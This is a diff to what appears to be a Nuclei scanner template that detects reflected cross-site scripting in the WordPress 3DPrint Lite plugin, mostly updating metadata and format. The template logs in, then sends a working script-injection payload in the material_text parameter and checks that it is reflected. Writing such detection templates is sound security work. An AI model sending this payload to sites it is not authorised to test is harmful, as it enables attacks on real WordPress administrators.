@@ -10,11 +10,14 @@ info:
   reference:
     - https://wpscan.com/vulnerability/5909e225-5756-472e-a2fc-3ac52c7fb909
     - https://www.acunetix.com/vulnerabilities/web/wordpress-plugin-3dprint-lite-cross-site-scripting-1-9-1-5/
+  classification:
+    cwe-id: CWE-80
   metadata:
-    verified: "true"
-  tags: 3dprint,lite,authenticated,wpscan,xss,wordpress,wp-plugin,wp
+    verified: true
+    max-request: 2
+  tags: 3dprint,lite,authenticated,wpscan,xss,wordpress,wp-plugin,wp,vuln
 
-requests:
+http:
   - raw:
       - |
         POST /wp-login.php HTTP/1.1
@@ -22,12 +25,10 @@ requests:
         Content-Type: application/x-www-form-urlencoded
 
         log={{username}}&pwd={{password}}&wp-submit=Log+In
-
       - |
         GET /wp-admin/admin.php?page=p3dlite_materials&material_text="><script>alert(document.domain)</script> HTTP/1.1
         Host: {{Hostname}}
 
-    cookie-reuse: true
     matchers:
       - type: dsl
         dsl:
@@ -36,3 +37,4 @@ requests:
           - 'contains(body_2, "<script>alert(document.domain)</script>")'
           - 'contains(body_2, "3dprint-lite_page_p3dlite_materials")'
         condition: and
+# digest: 4a0a00473045022100a21a8d54cf12c56a96f4a97563d3ba6d1a3128a995b7cf32fad65042e71bc29c02206f8d8a9d4fd4a260e8f54448226e04b9cfc3c4e177ada85911639b47f3593eee:922c64590222798bb761d5b6d8e72950
